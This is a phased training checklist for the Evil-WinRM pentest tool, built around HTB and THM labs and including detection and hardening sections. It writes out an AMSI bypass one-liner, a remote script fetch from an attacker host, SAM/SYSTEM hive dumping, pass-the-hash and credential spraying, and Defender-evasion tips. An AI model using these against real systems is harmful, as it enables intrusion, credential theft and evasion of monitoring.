# 🪟 Evil-WinRM: Complete Mastery Checklist

> **What is Evil-WinRM?** Evil-WinRM is a full-featured Windows Remote Management (WinRM) shell built specifically for penetration testing. It provides an interactive PowerShell session over WinRM (port 5985 HTTP / 5986 HTTPS) with built-in features for file upload/download, in-memory script loading, pass-the-hash, and AMSI bypass.
>
> **Why does it exist?** WinRM is Microsoft's remote management protocol — enabled by default on Windows Server 2012+ and any machine enrolled in a domain management policy. Once you have valid Windows credentials (from Responder, Impacket, NetExec, or Hashcat), Evil-WinRM gives you a clean interactive shell without needing RDP, SMB exec, or a full C2 implant.
>
> **When to use it:** After obtaining Windows credentials during post-exploitation. When WinRM (port 5985/5986) is open on the target. As a lightweight alternative to Metasploit's psexec when you want a clean PowerShell session. For HTB/THM Windows machines where WinRM is the intended entry method.
>
> **When to avoid it:** When WinRM is not enabled or firewalled off. When stealth is critical (WinRM connections are logged in Windows Event Log). When you need kernel-level access (use a full C2 like Sliver instead).
>
> **What mastering Evil-WinRM unlocks:** Seamless Windows post-exploitation shell access. Pass-the-hash without Metasploit. In-memory PowerShell script execution bypassing disk-based AV. SSL-encrypted command and control over WinRM. Readiness for OSCP, CRTP, HTB Active Directory machines.
>
> **Roadmap Phase:** Phase 4–5 (Exploitation and Post-Exploitation / Lateral Movement)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md) · [🐧 Metasploitable 2 Lab](../Lab/Metasploitable_2/TASK_LIST.md)

| Recon & Scanning | Exploitation | Post-Exploitation | AD Attacks |
|:-----------------|:-------------|:------------------|:-----------|
| [🗺️ Nmap](Nmap.md) | [💀 Metasploit](Metasploit_Framework.md) | [🐉 LinPEAS](LinPEAS.md) | [🩸 BloodHound](BloodHound.md) |
| [🔌 Netcat](Netcat.md) | [🔓 Hydra](Hydra.md) | [🪟 WinPEAS](WinPEAS.md) | [🐍 Impacket](Impacket.md) |
| [📂 Gobuster](Gobuster.md) | **🪟 Evil-WinRM** (you are here) | [🔥 Hashcat](Hashcat.md) | [🌐 NetExec](NetExec.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & WinRM Protocol | 5 | 2–3 hours |
| 2 | Core Usage & Authentication Methods | 6 | 4–5 hours |
| 3 | Intermediate (Scripts, Upload/Download, AMSI) | 6 | 4–6 hours |
| 4 | Advanced (SSL, Pass-the-Hash, Evasion) | 5 | 4–6 hours |
| 5 | Tool Integration | 4 | 2–3 hours |
| 6 | Practical Labs | 4 | 5–8 hours |
| 7 | Methodology & Detection Awareness | 3 | 2–3 hours |
| 8 | Mastery Challenges | 3 | 4–6 hours |
| | **Total** | **36** | **~27–40 hours** |

**Prerequisites:** Valid Windows credentials (username + password or NTLM hash). Target with WinRM enabled (port 5985/5986 open). Basic PowerShell knowledge. Understanding of NTLM authentication.

**Alternatives:** Metasploit `windows/manage/exec_powershell`, Impacket `wmiexec`/`smbexec`/`psexec`, NetExec `--exec-method wmiexec`, Sliver (full C2), RDP (GUI but noisier).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — WinRM Protocol Basics

- [ ] **Completed** · ⭐ Beginner · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand what WinRM is, when it is enabled by default, and what makes it useful for post-exploitation. |
| **Skills Learned** | WinRM vs RDP vs SMB exec distinction, ports 5985 (HTTP) and 5986 (HTTPS), PowerShell remoting as the underlying technology, which Windows versions enable WinRM by default. |
| **Practical Exercise** | On a Windows target: `winrm quickconfig` to enable WinRM. `winrm enumerate winrm/config/listener` to list listeners. From Kali: `nmap -p 5985,5986 <target>` to confirm WinRM is reachable. |
| **Expected Output** | Confirmation that port 5985 or 5986 is open. Understanding of when WinRM is available without extra configuration (domain-joined Windows Server, Exchange servers, any host with `Enable-PSRemoting` run). |
| **Common Mistakes** | Assuming WinRM is always open (it is not on workstations by default unless explicitly enabled or domain policy pushed it). Confusing port 5985 (HTTP, no TLS) with 5986 (HTTPS, TLS). |

### Task 1.2 — Installation & Version Check

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Install Evil-WinRM and verify it is working. |
| **Skills Learned** | Ruby gem installation, version management, confirming connectivity requirements. |
| **Practical Exercise** | `gem install evil-winrm` → `evil-winrm --version`. On Kali: `sudo apt install evil-winrm` (pre-packaged). Verify: `evil-winrm -h` shows full help with all flags. |
| **Expected Output** | Evil-WinRM installed, version displayed, help output shows `-i`, `-u`, `-p`, `-H`, `-S`, `-c`, `-k`, `-r`, `-s`, `-e` flags. |
| **Common Mistakes** | Not having Ruby installed (required dependency). Using an outdated version from apt when gem has a newer release. Not reading the help output (many features are flag-driven and not obvious). |

### Task 1.3 — Authentication Types Supported

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the four authentication methods Evil-WinRM supports and when to use each. |
| **Skills Learned** | Password auth (`-p`), pass-the-hash (`-H`), certificate-based auth (`-c`/`-k`), Kerberos auth (`-r`). |
| **Practical Exercise** | Read the Evil-WinRM README. For each auth type, write a one-line command example. Understand that pass-the-hash works because WinRM uses NTLM by default. |
| **Expected Output** | Command examples for all 4 auth methods. Understanding that `-H` takes the NT hash (not the full `LM:NT` format — just the NT portion). |
| **Common Mistakes** | Passing the full `LM:NT` hash instead of just the NT hash with `-H`. Not knowing that Kerberos auth (`-r`) requires a valid TGT in the cache. |

### Task 1.4 — Target Discovery: Identifying WinRM

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Identify which hosts in a network have WinRM enabled before attempting to connect. |
| **Skills Learned** | Nmap WinRM detection, NetExec WinRM check, understanding `(Pwn3d!)` indicator. |
| **Practical Exercise** | `nmap -p 5985,5986 --open 192.168.1.0/24` → find WinRM hosts. `nxc winrm <subnet> -u user -p pass` → NetExec shows `(Pwn3d!)` if the user can connect via WinRM (member of Remote Management Users or Administrators). |
| **Expected Output** | List of hosts with WinRM open. Understanding that open WinRM port alone is not enough — you need credentials that have WinRM access rights. |
| **Common Mistakes** | Thinking any valid domain credentials give WinRM access (they don't — the user must be in the `Remote Management Users` group or local Administrators). |

### Task 1.5 — First Shell Connection

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Establish your first Evil-WinRM shell using password credentials. |
| **Skills Learned** | Basic connection syntax, understanding the shell prompt, confirming you have a session. |
| **Practical Exercise** | `evil-winrm -i <target_ip> -u <username> -p <password>`. Confirm connection: shell prompt changes to `*Evil-WinRM* PS C:\Users\username\Documents>`. Run `whoami`, `hostname`, `ipconfig`. |
| **Expected Output** | Interactive PowerShell session. `whoami` returns domain\\username. Basic enumeration commands work. |
| **Common Mistakes** | Wrong IP (use the target IP, not your attack IP). WinRM blocked by firewall (confirm port 5985 is open first with Nmap). User not in Remote Management Users group (connection refused with "Access Denied"). |

---

# PHASE 2: CORE USAGE & AUTHENTICATION

---

### Task 2.1 — Pass-the-Hash Authentication

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Connect to a WinRM session using only an NTLM hash — no plaintext password needed. This is one of the most powerful lateral movement techniques in AD environments. |
| **Skills Learned** | NTLM hash authentication, extracting NT hash from secretsdump or Hashcat output, `-H` flag usage. |
| **Practical Exercise** | After obtaining hashes via `impacket-secretsdump` or Responder+Hashcat: extract the NT portion (the 32-char hex after the colon in `LM:NT`). `evil-winrm -i <target> -u Administrator -H <NT_hash>`. |
| **Expected Output** | Shell session authenticated with hash only. Understanding that this works because WinRM uses NTLM authentication which accepts the hash directly. |
| **Common Mistakes** | Using the full `aad3b435b51404eeaad3b435b51404ee:NT_HASH` format — use only the NT hash after the colon. Trying PTH on accounts where WinRM access is not granted. |

### Task 2.2 — File Upload and Download

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Transfer files between your attack machine and the target using Evil-WinRM's built-in upload/download commands. |
| **Skills Learned** | `upload`, `download` commands, transferring tools (WinPEAS, SharpHound, custom scripts) to target, exfiltrating loot (SAM, NTDS.dit, documents) back to your machine. |
| **Practical Exercise** | Inside WinRM shell: `upload /home/kali/SharpHound.exe C:\Windows\Temp\SharpHound.exe`. Run it: `.\SharpHound.exe -c All`. Download output: `download C:\Windows\Temp\20240101_BloodHound.zip /home/kali/loot/`. |
| **Expected Output** | Files successfully transferred both directions. SharpHound ZIP on your attack machine ready for BloodHound import. |
| **Common Mistakes** | Full Windows path needed on target side. Forgetting to specify destination path (file drops in current directory). Uploading to protected paths (use `C:\Windows\Temp` or `C:\Users\<user>\AppData\Local\Temp`). |

### Task 2.3 — In-Memory PowerShell Script Loading

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Load PowerShell scripts directly into memory without writing them to disk — evading file-based AV detection. |
| **Skills Learned** | `-s` flag for script directory, loading PowerView, PowerSploit, or custom scripts; understanding why in-memory execution is stealthier than disk execution. |
| **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -s /home/kali/scripts/`. Inside the shell, tab-complete to see available scripts. Type `Invoke-PowerView` (or relevant function) to load from memory. Alternatively: `IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')`. |
| **Expected Output** | PowerShell functions loaded and available in the session without writing .ps1 files to the target's disk. |
| **Common Mistakes** | Pointing `-s` to a directory without .ps1 files. AMSI still catching in-memory scripts (see Task 3.3 for bypass). Not understanding that IEX still triggers AMSI scanning of the downloaded string. |

### Task 2.4 — In-Memory .NET Assembly Execution

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Execute .NET executables (like Rubeus, SharpHound, Seatbelt) directly in memory via Evil-WinRM's `-e` flag — no disk write required. |
| **Skills Learned** | `-e` flag for executable directory, `Invoke-Binary` command, passing arguments to in-memory executables. |
| **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -e /home/kali/exe/`. Inside shell: `Invoke-Binary /home/kali/exe/Rubeus.exe asreproast` or `Invoke-Binary /home/kali/exe/Seatbelt.exe -group=all`. |
| **Expected Output** | .NET binary executed fully in memory. Output displayed in the Evil-WinRM shell. No file written to target disk. |
| **Common Mistakes** | Not all .NET assemblies work with Invoke-Binary (some require GUI, specific .NET versions, or interactive input). AMSI may still detect the assembly content (use AMSI bypass first). |

### Task 2.5 — SSL / HTTPS Mode (Port 5986)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Connect over HTTPS (port 5986) using SSL to encrypt the WinRM channel. |
| **Skills Learned** | `-S` flag for SSL, `-c`/`-k` for certificate authentication, handling self-signed certificates, when HTTPS WinRM is configured. |
| **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -S` (SSL, accept self-signed cert). For certificate auth: `evil-winrm -i <target> -c cert.pem -k key.pem -S`. |
| **Expected Output** | Session established over port 5986 with TLS encryption. |
| **Common Mistakes** | Using `-S` when target only has 5985 open (connection fails). Not accepting the self-signed certificate warning (Evil-WinRM handles this automatically with `-S`). |

### Task 2.6 — Kerberos Authentication

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Authenticate via Kerberos ticket (TGT/TGS) instead of password or hash — useful for Pass-the-Ticket attacks. |
| **Skills Learned** | `-r` flag for Kerberos realm, using `KRB5CCNAME` environment variable, combining with Impacket ticket extraction or Rubeus ticket dump. |
| **Practical Exercise** | After obtaining a TGT (via `impacket-getTGT` or `Rubeus asktgt`): `export KRB5CCNAME=/home/kali/user.ccache` → `evil-winrm -i <target_hostname> -r DOMAIN.LOCAL -u user`. Note: use hostname, not IP (Kerberos is hostname-based). |
| **Expected Output** | Shell session authenticated via Kerberos ticket. No password or hash needed. |
| **Common Mistakes** | Using IP instead of hostname (Kerberos SPN is hostname-based — IP will fail). KRB5CCNAME not exported in the current shell session. Clock skew > 5 minutes between attacker and DC (Kerberos authentication fails). |

---

# PHASE 3: INTERMEDIATE — SCRIPTS, AMSI & EVASION

---

### Task 3.1 — PowerShell Execution Policy Bypass

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand PowerShell execution policies and how WinRM/Evil-WinRM bypasses them by default. |
| **Skills Learned** | Execution policy levels (Restricted, RemoteSigned, Unrestricted, Bypass), why remote PowerShell sessions run in `Bypass` mode by default, `Set-ExecutionPolicy` commands. |
| **Practical Exercise** | In an Evil-WinRM session: `Get-ExecutionPolicy` (note the current policy — usually Bypass in remote sessions). Compare with local PowerShell: `powershell -c "Get-ExecutionPolicy"`. |
| **Expected Output** | Understanding that Evil-WinRM sessions bypass execution policy by default. Scripts run without needing `-ExecutionPolicy Bypass` flags. |
| **Common Mistakes** | Thinking execution policy is a security boundary (it is not — it is a convenience control, easily bypassed). |

### Task 3.2 — Loading PowerView and Running AD Enumeration

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Evil-WinRM's script loading to run PowerView AD enumeration without touching disk. |
| **Skills Learned** | PowerView functions: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`, `Find-LocalAdminAccess`, `Get-ObjectAcl`, `Invoke-ACLScanner`. |
| **Practical Exercise** | `evil-winrm -i <DC_IP> -u user -p pass -s /home/kali/PowerSploit/Recon/`. Inside shell: `PowerView` tab-complete → `Get-NetUser -SPN` (find Kerberoastable users) → `Get-NetGroup "Domain Admins" -Recurse` → `Find-LocalAdminAccess`. |
| **Expected Output** | AD enumeration data returned in-session. Kerberoastable accounts listed. Local admin access found on target machines. |
| **Common Mistakes** | AMSI blocking PowerView (see Task 3.3). Not using `-s` to load the script directory (functions not available). |

### Task 3.3 — AMSI Bypass

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Bypass Windows AMSI (Antimalware Scan Interface) to load offensive PowerShell tools that would otherwise be detected and blocked. |
| **Skills Learned** | How AMSI works (hooks `AmsiScanBuffer` in `amsi.dll`), common AMSI bypass techniques (memory patching, reflection, obfuscation), using pre-built bypass snippets. |
| **Practical Exercise** | In Evil-WinRM session, paste a known AMSI bypass one-liner (patching `amsi.dll` in memory). Example pattern (obfuscate for your engagement): `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`. Then load PowerView — should no longer be blocked. |
| **Expected Output** | PowerView or other offensive tools load without AMSI blocking them. Error `This script contains malicious content` stops appearing. |
| **Common Mistakes** | Using publicly known unobfuscated bypasses that are themselves detected by AMSI. Not testing whether AMSI is actually blocking (check for error messages first). Over-relying on a single bypass technique (defenders update signatures). |

### Task 3.4 — Enumeration with Built-in Windows Commands

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Perform host and AD enumeration using only native Windows commands — no extra tools needed, lower AV footprint. |
| **Skills Learned** | `net user /domain`, `net group "Domain Admins" /domain`, `net localgroup Administrators`, `systeminfo`, `whoami /all`, `reg query`, `ipconfig /all`, `netstat -an`. |
| **Practical Exercise** | In Evil-WinRM session: `whoami /all` (privileges + group membership) → `net user /domain` → `net group "Domain Admins" /domain` → `systeminfo | findstr /i "domain"` → `netstat -an | findstr LISTENING`. |
| **Expected Output** | Domain name confirmed. Domain Admins listed. Current user privileges documented. Listening services mapped. |
| **Common Mistakes** | Triggering AV/EDR with aggressive tooling before doing basic native enumeration. Missing `whoami /priv` — many privesc paths require specific Windows privileges (SeImpersonatePrivilege, SeDebugPrivilege). |

### Task 3.5 — Transferring WinPEAS and Running Privilege Escalation

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Upload WinPEAS via Evil-WinRM and run it to identify Windows privilege escalation vectors. |
| **Skills Learned** | WinPEAS upload workflow, interpreting WinPEAS output, identifying high-value findings (unquoted service paths, weak permissions, stored credentials, autologon). |
| **Practical Exercise** | `upload /home/kali/WinPEAS.exe C:\Windows\Temp\wp.exe` → `C:\Windows\Temp\wp.exe` → pipe output to file: `C:\Windows\Temp\wp.exe | Out-File C:\Windows\Temp\wp_out.txt` → `download C:\Windows\Temp\wp_out.txt`. |
| **Expected Output** | WinPEAS output with color-coded findings. High-value findings in yellow/red. Privesc vectors identified. |
| **Common Mistakes** | AV quarantining WinPEAS (obfuscate or use in-memory execution via `-e` flag). Running WinPEAS as a low-priv user and not understanding which findings require higher privileges to exploit. |

### Task 3.6 — Log Awareness: What Gets Recorded

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand what Windows event logs capture about WinRM connections — know your detection footprint. |
| **Skills Learned** | Event ID 4624 (logon) with Logon Type 3 (network), Event ID 4625 (failed logon), WinRM-specific logs in `Microsoft-Windows-WinRM/Operational`, PowerShell Script Block Logging (Event ID 4104). |
| **Practical Exercise** | After connecting, on the target: `Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 10 | Format-List`. Note the connection event. Check: `Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select -First 5`. |
| **Expected Output** | WinRM connection events visible in Windows event logs. Understanding that blue team will see these connections — plan accordingly. |
| **Common Mistakes** | Thinking WinRM is "silent" — it generates clear event log entries. Not disabling PowerShell Script Block Logging before running offensive scripts (all commands logged to Event ID 4104 if enabled). |

---

# PHASE 4: ADVANCED — LATERAL MOVEMENT CHAINS

---

### Task 4.1 — Chaining NetExec → Evil-WinRM

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Use NetExec to identify WinRM-accessible machines with valid credentials, then pivot to Evil-WinRM for a full interactive shell. |
| **Skills Learned** | `nxc winrm` module, `(Pwn3d!)` indicator, credential spraying across multiple hosts, chaining discovery → shell. |
| **Practical Exercise** | `nxc winrm 192.168.1.0/24 -u Administrator -p 'Password123'` → hosts showing `(Pwn3d!)` are WinRM-accessible. For each: `evil-winrm -i <host> -u Administrator -p 'Password123'`. |
| **Expected Output** | List of WinRM-accessible hosts with valid creds. Interactive shell on each confirmed host. |
| **Common Mistakes** | Not checking for `(Pwn3d!)` in NetExec output (open WinRM port ≠ access rights). Running Evil-WinRM against all hosts without first confirming access (generates lots of failed auth noise). |

### Task 4.2 — Pass-the-Hash Lateral Movement Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Build a full PTH lateral movement chain: dump hashes → spray across network → shell on target. |
| **Skills Learned** | `impacket-secretsdump` → NT hash extraction → `nxc winrm` PTH spray → `evil-winrm -H` shell. |
| **Practical Exercise** | `impacket-secretsdump domain/user:pass@dc01` → copy NT hash of Administrator → `nxc winrm 192.168.1.0/24 -u Administrator -H <NT_hash>` → identify `(Pwn3d!)` hosts → `evil-winrm -i <target> -u Administrator -H <NT_hash>`. |
| **Expected Output** | Shell access on target using only an NTLM hash. No plaintext password at any point in the chain. |
| **Common Mistakes** | Local Administrator hash reuse requires the account to have the same hash on both machines (common with default images, not always true). Protected Users group members cannot use NTLM (PTH fails for them). |

### Task 4.3 — SharpHound Collection via Evil-WinRM

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Evil-WinRM to deliver and execute SharpHound for BloodHound data collection from within the network. |
| **Skills Learned** | SharpHound collection methods, `-c All` flag, output ZIP retrieval, feeding data to BloodHound CE. |
| **Practical Exercise** | `upload /home/kali/SharpHound.exe C:\Windows\Temp\sh.exe` → `C:\Windows\Temp\sh.exe -c All --outputdirectory C:\Windows\Temp\` → `download C:\Windows\Temp\<date>_BloodHound.zip /home/kali/loot/` → import to BloodHound CE. |
| **Expected Output** | BloodHound ZIP imported to CE. Attack paths visible. DCSync rights, Kerberoastable accounts, shortest path to DA displayed. |
| **Common Mistakes** | SharpHound detected by AV (use `-e` in-memory execution via `Invoke-Binary`). Not downloading the output ZIP before the session ends. Running SharpHound as a low-priv user (some collection methods require admin). |

### Task 4.4 — Credential Extraction via Registry (SAM/SYSTEM)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Dump Windows SAM and SYSTEM hives via an Evil-WinRM session and extract local account hashes offline. |
| **Skills Learned** | `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, `reg save HKLM\SECURITY` commands, downloading hive files, offline extraction with `impacket-secretsdump`. |
| **Practical Exercise** | In Evil-WinRM (as Administrator): `reg save HKLM\SAM C:\Windows\Temp\sam.hive` → `reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive` → `download C:\Windows\Temp\sam.hive` → `download C:\Windows\Temp\sys.hive` → `impacket-secretsdump -sam sam.hive -system sys.hive LOCAL`. |
| **Expected Output** | Local account NTLM hashes extracted offline. Administrator hash available for PTH. |
| **Common Mistakes** | Requires SYSTEM or Administrator privileges. Not cleaning up the hive files after extraction (forensic evidence). Forgetting to extract SECURITY hive (contains cached domain credentials). |

### Task 4.5 — Bypassing Defender / EDR in WinRM Sessions

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 50 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand how to operate effectively in an Evil-WinRM session when Windows Defender or EDR is active. |
| **Skills Learned** | AMSI bypass (Task 3.3), disabling Defender temporarily (if admin), using `-e` for in-memory .NET execution, obfuscating uploaded files, using LOLBins (Living Off the Land Binaries). |
| **Practical Exercise** | Try uploading a known offensive tool (e.g., Mimikatz) — observe Defender quarantine. Then: (1) use AMSI bypass + in-memory execution. (2) Alternatively use LOLBins: `wmic`, `rundll32`, `regsvr32` for post-exploitation without custom tools. |
| **Expected Output** | Post-exploitation actions completed despite active Defender. Understanding of tiered evasion approach: in-memory first, LOLBins second, obfuscated disk files last resort. |
| **Common Mistakes** | Immediately disabling Defender (very noisy, triggers alerts). Not trying in-memory execution before disk-based approaches. Using well-known tool names (rename binaries before uploading). |

---

# PHASE 5: TOOL INTEGRATION

---

### Task 5.1 — Integration with NetExec

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use NetExec as the discovery and credential-spray layer, then hand off to Evil-WinRM for interactive access. |
| **Practical Exercise** | `nxc winrm <subnet> -u users.txt -p passwords.txt` → collect `(Pwn3d!)` results → automate Evil-WinRM connection for each valid combination. |
| **Expected Output** | Multi-host credential spray results. Interactive shell on each accessible host. |

### Task 5.2 — Integration with Impacket (Secretsdump → PTH)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Chain Impacket secretsdump output directly into Evil-WinRM pass-the-hash sessions. |
| **Practical Exercise** | `impacket-secretsdump` output → parse NT hashes → `evil-winrm -i <target> -u <user> -H <NT_hash>` for each account. |
| **Expected Output** | Working PTH sessions from secretsdump output. Admin shell on multiple machines from a single hash dump. |

### Task 5.3 — Integration with BloodHound (Path → Shell)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use a BloodHound attack path to navigate through multiple Evil-WinRM sessions to reach Domain Admin. |
| **Practical Exercise** | BloodHound shows path: UserA → GenericAll → UserB → AdminTo → Server01 → Server01 has DCSync rights. Follow each hop: Evil-WinRM as UserA → reset UserB password → Evil-WinRM as UserB → DCSync via Impacket. |
| **Expected Output** | Successful Domain Admin compromise following a multi-hop BloodHound path. |

### Task 5.4 — Integration with Hashcat (Crack → Shell)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Hashcat cracked passwords to authenticate with Evil-WinRM. |
| **Practical Exercise** | Hashcat cracks `P@ssw0rd1` from NTLM hash → `evil-winrm -i <target> -u <user> -p 'P@ssw0rd1'`. Compare with direct PTH (`-H`) — both work. Know when plaintext is needed vs when hash suffices. |
| **Expected Output** | Shell via cracked password. Understanding of when to crack vs when to PTH. |

---

# PHASE 6: PRACTICAL LABS

---

### Lab 6.1 — HTB Machine: Forest (AD + WinRM)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 3–4 hours

| Field | Detail |
|:---|:---|
| **Scenario** | HackTheBox machine "Forest" — a domain controller with AS-REP Roasting, DCSync, and WinRM access. Classic Evil-WinRM lab. |
| **Tools Needed** | Kerbrute → Impacket GetNPUsers → Hashcat → Evil-WinRM → BloodHound → WriteDACL abuse → DCSync |
| **Success Criteria** | Root flag obtained via Domain Admin shell through Evil-WinRM. Full attack chain documented. |

### Lab 6.2 — HTB Machine: Active (Kerberoasting + WinRM)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 2–3 hours

| Field | Detail |
|:---|:---|
| **Scenario** | HackTheBox "Active" — SMB share → GPP credentials → Kerberoasting → Administrator shell via Evil-WinRM. |
| **Tools Needed** | Nmap → SMBclient → Impacket GetUserSPNs → Hashcat → Evil-WinRM |
| **Success Criteria** | Administrator shell via Evil-WinRM after cracking Kerberoast hash. |

### Lab 6.3 — Local AD Lab: PTH Lateral Movement

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 2–3 hours

| Field | Detail |
|:---|:---|
| **Scenario** | Home lab with Windows Server DC + 2 Windows 10 workstations. Obtain hash on one workstation, use PTH to Evil-WinRM into the DC. |
| **Tools Needed** | NetExec → Responder → Hashcat → Evil-WinRM PTH |
| **Success Criteria** | Shell on DC via PTH without ever cracking the plaintext password. |

### Lab 6.4 — TryHackMe: Attacktive Directory

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 2 hours

| Field | Detail |
|:---|:---|
| **Scenario** | THM guided AD room covering Kerbrute enumeration, AS-REP Roasting, Impacket, and Evil-WinRM shell access. |
| **Tools Needed** | Kerbrute → Impacket → Hashcat → Evil-WinRM |
| **Success Criteria** | All THM tasks completed. Evil-WinRM session established on the target. |

---

# PHASE 7: METHODOLOGY & DETECTION

---

### Task 7.1 — Evil-WinRM in the AD Attack Methodology

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Place Evil-WinRM correctly in the full AD attack kill chain. |
| **Skills Learned** | Kill chain positioning: Enumeration (Nmap/NetExec) → Credential Access (Responder/Impacket/Hashcat) → **Lateral Movement (Evil-WinRM)** → Escalation (BloodHound/WinPEAS) → Persistence/Exfil. |
| **Practical Exercise** | Draw the full AD attack chain. Mark each tool. Identify where Evil-WinRM sits (lateral movement / interactive access layer). |
| **Expected Output** | Attack chain diagram with Evil-WinRM positioned after credential access. |

### Task 7.2 — Defensive Detection Methods

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand how blue teams detect Evil-WinRM usage. |
| **Skills Learned** | Event ID 4624 Logon Type 3 (network logon), WinRM operational log, PowerShell Script Block Logging (Event 4104), SIEM rules for WinRM lateral movement, network detection (port 5985 connections from non-admin workstations). |
| **Practical Exercise** | Review Windows event logs after a test connection. Identify what a defender would see in a SIEM. Write a detection rule: "Alert on WinRM connections (port 5985) from non-IT workstations during business hours." |
| **Expected Output** | Detection rule documented. Understanding of which log sources capture WinRM activity. |

### Task 7.3 — Hardening WinRM (Defensive)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Know how to harden WinRM to prevent unauthorized access — from the defender perspective. |
| **Skills Learned** | Restrict WinRM access via firewall rules, use Windows Firewall to limit port 5985/5986 to management subnets only, enable PowerShell Script Block Logging, use JEA (Just Enough Administration) to limit remote session capabilities, use 5986 (HTTPS) only. |
| **Expected Output** | WinRM hardening checklist. Understanding that Evil-WinRM is only effective against improperly configured or unmonitored WinRM. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Multi-Hop Lateral Movement

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 2–3 hours

Compromise a foothold account via phishing sim or brute-force. Use BloodHound to find a 3-hop path to Domain Admin. Execute each hop using Evil-WinRM sessions. Document each credential used, each host touched, and each technique applied. Deliver a mini attack path report.

### Challenge 8.2 — Zero-Tool Shell (LOLBins Only)

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 3–4 hours

Get an Evil-WinRM shell, then complete post-exploitation (user enumeration, privilege check, hash dump) using ONLY native Windows binaries — no uploaded tools, no PowerShell scripts from disk, no `-e` or `-s` flags. Use `wmic`, `reg`, `net`, `sc`, `tasklist`, `ipconfig`. Demonstrates LOLBin mastery.

### Challenge 8.3 — Full AD Chain: Zero to DA

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 4–6 hours

